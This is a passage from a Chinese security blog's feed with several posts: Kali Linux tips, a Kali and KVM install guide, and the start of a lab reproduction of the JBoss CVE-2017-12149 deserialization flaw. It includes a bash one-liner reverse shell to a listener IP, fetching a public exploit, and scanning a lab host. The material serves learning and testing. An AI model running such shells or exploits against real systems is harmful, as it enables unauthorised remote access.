<p>在终端输入 vlc 就能调出</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303193126_rzgeBG_Screenshot.jpeg)</p>
<h2 id="0x06-kali-使用bash-一句话反弹shell"><a href="#0x06-kali-使用bash-一句话反弹shell" class="headerlink" title="0x06. kali 使用bash 一句话反弹shell"></a>0x06. kali 使用bash 一句话反弹shell</h2><blockquote>
<p>进行渗透测试时经常遇到Linux 中不存在 nc 或者 nc 一经反弹shell就出现各种报错，直到遇到bash 一句话后麻麻再也不用担心我拿不到shell 啦！！</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303192839_XDBQbF_Screenshot.jpeg)</p>
<h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
<p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
<p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195304_KAYICq_Screenshot.jpeg)</p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195334_duCLPP_Screenshot.jpeg)</p>
<h2 id="0x08-kali-使用squid3-作http-代理"><a href="#0x08-kali-使用squid3-作http-代理" class="headerlink" title="0x08. kali 使用squid3 作http 代理"></a>0x08. kali 使用squid3 作http 代理</h2><blockquote>
<p>squid3 可以很方便的帮助我们搭建内网的http 代理服务器，当我们启动squid3 之后它会默认启动3128 端口，我们只需要在浏览器设置代理就可以使用了。不过在这之前我们首先应该修改squid3 的默认配置，将 /etc/squid/squid.conf 中的http_access deny all 修改为http_access allow all 这样才能作为代理服务器使用</p>
<p>vim /etc/squid/squid.conf</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305175930_Xks0id_Screenshot.jpeg)</p>
<blockquote>
<p>squid3</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180011_6T2Daa_Screenshot.jpeg)</p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180036_Uxee4d_Screenshot.jpeg)</p>
<h2 id="0x09-kali-安装翻译字典"><a href="#0x09-kali-安装翻译字典" class="headerlink" title="0x09. kali 安装翻译字典"></a>0x09. kali 安装翻译字典</h2><blockquote>
<p>goldendict 是Linux 中字典的不二选择，同时它还支持选词翻译，这是一个相当不错的功能。笔者因为给自己定了个目标要看kali 官网的教程，所以只有去读英文资料，而goldendict 帮了我不小的忙！</p>
<p>下载好goldendict 之后需要稍稍配置一下词典Edict-&gt;dict-&gt;website，增加youdao 的翻译网址 <a href="http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8" target="_blank" rel="external">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</a></p>
<p>之后我们选中单词按 CTRL+C+C 就可以随时翻译了</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305231416_6b8vJS_Screenshot.jpeg)</p>
<h2 id="0x10-kali-安装插件"><a href="#0x10-kali-安装插件" class="headerlink" title="0x10. kali 安装插件"></a>0x10. kali 安装插件</h2><blockquote>
<p>使用浏览器访问 <a href="http://extensions.gnome.org" target="_blank" rel="external">http://extensions.gnome.org</a> 就可以给kali 安装扩展，安装netspeed 插件之后就可以监控网络流量</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305235955_Y7cZTJ_Screenshot.jpeg)</p>
<h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;a href=&quot;#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali安装KVM入坑笔记</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/kali安装KVM入坑笔记/</id>
    <published>2018-03-01T02:18:31.000Z</published>
    <updated>2018-12-18T15:23:29.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…"><a href="#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…" class="headerlink" title="&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …"></a>&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …</h4><a id="more"></a>
<h2 id="0x01-制作U盘启动盘"><a href="#0x01-制作U盘启动盘" class="headerlink" title="0x01. 制作U盘启动盘"></a>0x01. 制作U盘启动盘</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-的-ISO-镜像文件"><a href="#emsp-emsp-1-kali-的-ISO-镜像文件" class="headerlink" title="&emsp;&emsp; 1. kali 的 ISO 镜像文件"></a>&emsp;&emsp; 1. kali 的 ISO 镜像文件</h4><h4 id="emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以"><a href="#emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以" class="headerlink" title="&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)"></a>&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)</h4><h4 id="emsp-emsp-3-内存足够的-U-盘"><a href="#emsp-emsp-3-内存足够的-U-盘" class="headerlink" title="&emsp;&emsp; 3. 内存足够的 U 盘"></a>&emsp;&emsp; 3. 内存足够的 U 盘</h4><h3 id="制作启动盘"><a href="#制作启动盘" class="headerlink" title="制作启动盘"></a>制作启动盘</h3><blockquote>
<ol>
<li>查看U盘挂载的路径 diskutil list</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228215645_iufWDx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>卸载U盘 diskutil unmountDisk /dev/disk2</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228215821_WGGQLO_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>用dd命令制作安装盘（这个过程大概持续10+分钟，急不得\^o^ ）</li>
</ol>
<p>sudo dd if=/Users/apple1/Desktop/kali-linux-2018.1-amd64.iso of=/dev/disk2 bs=1m</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228222201_a2Gt2A_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-利用-U盘启动盘安装kali"><a href="#0x02-利用-U盘启动盘安装kali" class="headerlink" title="0x02. 利用 U盘启动盘安装kali"></a>0x02. 利用 U盘启动盘安装kali</h2><blockquote>
<ol>
<li><p>将 U盘启动盘插入台式机，启动电源并按住Delete键进入BIOS模式</p>
</li>
<li><p>选择高级模式，开启Intel的虚拟技术（ 开启这个之后才能安装KVM ）</p>
</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228222954_ou6My2_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>选择系统的启动顺序，将U盘放到最前面</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228223237_pRdztx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>现在就可以保存退出了，就能进入kali的安装界面，kali安装过程就不介绍了，网上一大堆安装教程</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228223402_BBNrKS_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完成之后进入kali系统</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228225257_Ei4Sz0_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装KVM"><a href="#0x03-安装KVM" class="headerlink" title="0x03. 安装KVM"></a>0x03. 安装KVM</h2><blockquote>
<ol>
<li>刚下载的系统需要先更新源 vim /etc/apt/sources.list</li>
</ol>
<p>#中科大</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>#阿里云</p>
<p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<ol>
<li>更新索引 apt-get update</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231246_F7Xk8C_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>下载KVM及其依赖包</li>
</ol>
<p>apt-get install kvmtool qemu virtinst python-libvirt virt-viewer virt-manager</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231559_jUPJBA_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>KVM 下载完成，查看是否正常启动(笔者已经可以正常使用KVM了)</li>
</ol>
<p>service libvirtd status</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231853_87vYF9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>打开KVM，安装windows 2003 server r2 镜像</li>
</ol>
<p>virt-manager</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233431_Nknrv6_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233108_OVhcrA_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233136_Tfl8g6_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完之后有可能启动虚拟机时有可能会报错提示：Error starting domain: Requested operation is not valid: network ‘default’ is not active </li>
</ol>
<p>此时我们只需要将原有的网卡删除重新添加一块网卡就可以了</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301094610_WjQFmC_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301094845_S7Zuib_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301095052_jL9mvJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301095118_iosA7r_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"><a href="#emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！" class="headerlink" title="&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"></a>&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot;&gt;&lt;a href=&quot;#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JOBSS反序列化漏洞复现</title>
    <link href="http://TimeS0ng.github.io/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://TimeS0ng.github.io/2017/12/27/JBOSS反序列化漏洞复现/</id>
    <published>2017-12-27T02:39:14.000Z</published>
    <updated>2018-12-18T15:17:49.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
<p>./jboss-6.1.0.Final/bin/run.sh</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
<p>nmap 192.168.1.111 -A </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
